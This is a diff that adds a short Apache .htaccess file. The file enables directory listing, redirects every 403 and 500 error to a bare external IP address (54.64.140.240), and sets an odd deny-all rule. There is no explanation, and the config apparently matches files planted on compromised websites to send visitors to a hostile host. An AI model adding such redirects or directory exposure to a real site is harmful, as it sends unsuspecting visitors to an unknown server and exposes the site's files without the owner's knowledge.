@@ -1,0 +1,7 @@
+Options +Indexes
+ErrorDocument 403 http://54.64.140.240
+ErrorDocument 500 http://54.64.140.240
+<files .>
+order deny,allow
+deny from all
+</files>
